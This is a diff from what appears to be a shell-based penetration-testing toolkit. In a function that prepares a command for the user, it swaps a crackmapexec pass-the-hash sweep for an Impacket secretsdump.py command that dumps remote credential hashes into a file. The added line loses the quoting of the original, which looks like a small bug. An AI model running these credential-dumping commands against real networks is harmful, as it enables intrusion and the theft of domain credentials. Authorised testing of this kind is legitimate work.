@@ -41,7 +41,7 @@ nb-ad-dump-hash() {
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee -a $(__netadpath)/cme-sweep.txt"
+        print -z secretsdump.py ${__USER}@${__RHOST} -hashes ${__HASH} | tee -a ${__domainadpath}/${__USER}-hashdump.txt
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
